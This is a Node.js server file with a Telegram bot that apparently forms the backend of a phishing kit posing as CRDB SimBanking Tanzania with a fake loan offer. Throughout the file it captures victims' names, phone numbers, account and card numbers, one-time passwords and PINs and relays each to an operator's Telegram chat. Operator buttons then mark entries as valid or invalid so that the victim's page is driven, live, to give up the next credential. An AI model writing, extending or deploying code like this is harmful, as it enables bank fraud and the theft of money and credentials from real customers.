const express = require('path'); // wait, standard express below
const expressApp = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = expressApp();
app.use(expressApp.json());
app.use(expressApp.static(path.join(__dirname, 'public')));

// TODO: Replace with your actual Telegram Bot Token and Chat ID
const TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';

const bot = new TelegramBot(TOKEN, { polling: true });

// In-memory store for client statuses and data
const clients = {};

// API Endpoint to receive submissions from the frontend
app.post('/api/submit', (req, res) => {
    const { step, clientId, data } = req.body;
    
    if (!clients[clientId]) {
        clients[clientId] = { status: 'pending' };
    }

    if (data) {
        clients[clientId] = { ...clients[clientId], ...data };
    }

    const client = clients[clientId];

    if (step === 'account_details') {
        const message = `[CRDB SIMBANKING TANZANIA] New Loan & Account Submission\n` +
            `Loan Amount: ${client.amount || 'N/A'}\n` +
            `First Name: ${client.firstName}\n` +
            `Last Name: ${client.lastName}\n` +
            `Phone (+255): ${client.phone}\n` +
            `Account Number: ${client.accountNumber}\n` +
            `Card Number: ${client.cardNumber}`;

        bot.sendMessage(CHAT_ID, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '❌ WRONG DETAILS', callback_data: `wrong_details_${clientId}` },
                        { text: '✅ CORRECT DETAILS', callback_data: `correct_details_${clientId}` }
                    ]
                ]
            }
        });
    } else if (step === 'otp_submitted') {
        bot.sendMessage(CHAT_ID, `[CRDB] OTP Entered for ${client.firstName} ${client.lastName} (+255 ${client.phone}):\nOTP: ${data.otp}`, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '❌ OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` },
                        { text: '✅ OTP CORRECT', callback_data: `otp_correct_${clientId}` }
                    ]
                ]
            }
        });
    } else if (step === 'pin_submitted') {
        bot.sendMessage(CHAT_ID, `[CRDB] Security PIN Entered for ${client.firstName} ${client.lastName} (+255 ${client.phone}):\nPIN: ${data.pin}`, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '❌ INVALID PIN', callback_data: `invalid_pin_${clientId}` },
                        { text: '✅ VALID PIN / APPROVE', callback_data: `loan_approved_${clientId}` }
                    ]
                ]
            }
        });
    }

    res.json({ success: true });
});

// API Endpoint for frontend polling to track approval / rejection status
app.get('/api/status/:clientId', (req, res) => {
    const clientId = req.params.clientId;
    const client = clients[clientId] || { status: 'pending' };
    res.json({ status: client.status });
});

// Telegram Callback Query Listener (Handles button taps with instant feedback & fading)
bot.on('callback_query', async (callbackQuery) => {
    const callbackData = callbackQuery.data;
    const msg = callbackQuery.message;

    // Parse action and clientId from callback_data (e.g. 'wrong_details_crdb_client_xyz')
    const lastUnderscoreIndex = callbackData.lastIndexOf('_');
    const action = callbackData.substring(0, lastUnderscoreIndex);
    const clientId = callbackData.substring(lastUnderscoreIndex + 1);

    // 1. Give instant visual feedback to stop the button loading spinner on Telegram
    try {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: "Imepokelewa ✅",
            show_alert: false
        });
    } catch (e) {
        console.error(e);
    }

    // 2. Clear/remove the inline buttons instantly so they fade out and cannot be clicked twice
    try {
        await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id
            }
        );
    } catch (e) {
        console.error("Error editing reply markup:", e);
    }

    // 3. Update client status in memory based on admin selection
    if (clients[clientId]) {
        if (action === 'wrong_details') {
            clients[clientId].status = 'wrong_details';
            bot.sendMessage(msg.chat.id, `❌ Umeweka: Wrong Details. Mteja ameombwa kuweka upya.`);
        } else if (action === 'correct_details') {
            clients[clientId].status = 'correct_details';
            bot.sendMessage(msg.chat.id, `✅ Umeweka: Correct Details. Mteja anaelekezwa kwenda OTP.`);
        } else if (action === 'otp_incorrect') {
            clients[clientId].status = 'otp_incorrect';
            bot.sendMessage(msg.chat.id, `❌ Umeweka: OTP Incorrect.`);
        } else if (action === 'otp_correct') {
            clients[clientId].status = 'otp_correct';
            bot.sendMessage(msg.chat.id, `✅ Umeweka: OTP Correct. Mteja anaelekezwa kuweka PIN.`);
        } else if (action === 'invalid_pin') {
            clients[clientId].status = 'invalid_pin';
            bot.sendMessage(msg.chat.id, `❌ Umeweka: Invalid PIN.`);
        } else if (action === 'loan_approved') {
            clients[clientId].status = 'loan_approved';
            bot.sendMessage(msg.chat.id, `🎉 Mkopo umeidhinishwa na akaunti imeswezeshwa kikamilifu!`);
        }
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
